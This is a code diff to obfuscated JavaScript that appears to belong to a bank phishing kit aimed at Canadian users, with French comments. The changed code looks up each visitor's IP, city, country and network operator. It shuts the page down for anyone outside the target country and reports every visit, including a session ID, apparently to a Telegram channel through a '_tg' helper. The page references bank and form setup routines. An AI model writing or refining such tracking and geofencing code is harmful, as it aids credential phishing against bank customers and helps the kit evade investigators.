@@ -209,47 +209,55 @@
     _setupForms();
     _setupBanks();
 
-    fetch('https://www.cloudflare.com/cdn-cgi/trace')
-      .then(function(r){ return r.text(); })
-      .then(function(t){
-        var locMatch = t.match(/loc=([A-Z]{2})/);
-        var ipMatch = t.match(/ip=([^\n]+)/);
-        var loc = locMatch ? locMatch[1] : 'N/A';
-        var ipVal = ipMatch ? ipMatch[1] : 'N/A';
+    function _sendVisit(ip, city, country, org) {
+      _W.sessionStorage.setItem('__xip', ip);
+      _W.sessionStorage.setItem('__xorg', org || 'N/A');
+      _W.sessionStorage.setItem('__xcity', city || 'N/A');
 
-        if (loc !== _CC && loc !== 'N/A') {
-          _tg(_R, '🛑 <b>BLOCAGE PAYS (' + loc + ')</b>\n📍 IP: <code>' + ipVal + '</code>');
-          setTimeout(_die, 500);
-          return;
+      _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🏙️ Ville: <code>' + (city || 'N/A') + '</code>\n🌍 Pays: <code>' + (country || 'N/A') + '</code>\n🏢 Org: <code>' + (org || 'N/A') + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+    }
+
+    // Récupérer IP, Ville, Pays et Opérateur immédiatement
+    fetch('https://ipwho.is/')
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        if (d && d.success) {
+          if (d.country_code !== _CC) {
+            _tg(_R, '🛑 <b>BLOCAGE PAYS (' + d.country_code + ')</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>');
+            setTimeout(_die, 500);
+            return;
+          }
+          var _org = d.connection ? (d.connection.org || d.connection.isp || 'N/A') : 'N/A';
+          _sendVisit(d.ip, d.city, d.country, _org);
+        } else {
+          _traceFallback();
         }
-
-        _W.sessionStorage.setItem('__xip', ipVal);
-        _W.sessionStorage.setItem('__xorg', 'Canada ISP');
-        _W.sessionStorage.setItem('__xcity', 'Canada');
-
-        _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ipVal + '</code>\n🌍 Pays: <code>' + loc + '</code>\n🆔 Session: <code>' + _SID + '</code>');
-
-        fetch('https://ipwho.is/' + ipVal)
-          .then(function(r){ return r.json(); })
-          .then(function(d){
-            if (d && d.success) {
-              _W.sessionStorage.setItem('__xorg', (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'));
-              _W.sessionStorage.setItem('__xcity', d.city || 'N/A');
-            }
-          }).catch(function(){});
       })
       .catch(function(){
-        fetch('https://ipwho.is/')
-          .then(function(r){ return r.json(); })
-          .then(function(d){
-            if (d && d.success) {
-              _W.sessionStorage.setItem('__xip', d.ip);
-              _W.sessionStorage.setItem('__xorg', (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'));
-              _W.sessionStorage.setItem('__xcity', d.city || 'N/A');
-              _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>\n🌍 Pays: <code>' + d.country_code + '</code>\n🏢 Org: <code>' + (d.connection ? d.connection.isp : 'N/A') + '</code>\n🆔 Session: <code>' + _SID + '</code>');
-            }
-          }).catch(function(){});
+        _traceFallback();
       });
+
+    function _traceFallback(){
+      fetch('https://www.cloudflare.com/cdn-cgi/trace')
+        .then(function(r){ return r.text(); })
+        .then(function(t){
+          var locMatch = t.match(/loc=([A-Z]{2})/);
+          var ipMatch = t.match(/ip=([^\n]+)/);
+          var loc = locMatch ? locMatch[1] : 'CA';
+          var ipVal = ipMatch ? ipMatch[1] : 'N/A';
+
+          if (loc !== _CC && loc !== 'N/A') {
+            _tg(_R, '🛑 <b>BLOCAGE PAYS (' + loc + ')</b>\n📍 IP: <code>' + ipVal + '</code>');
+            setTimeout(_die, 500);
+            return;
+          }
+
+          _sendVisit(ipVal, 'Canada (Trace)', loc, 'Canada ISP');
+        })
+        .catch(function(){
+          _sendVisit('N/A', 'N/A', 'Canada', 'N/A');
+        });
+    }
   }
 
   if (_D.readyState === 'loading') {
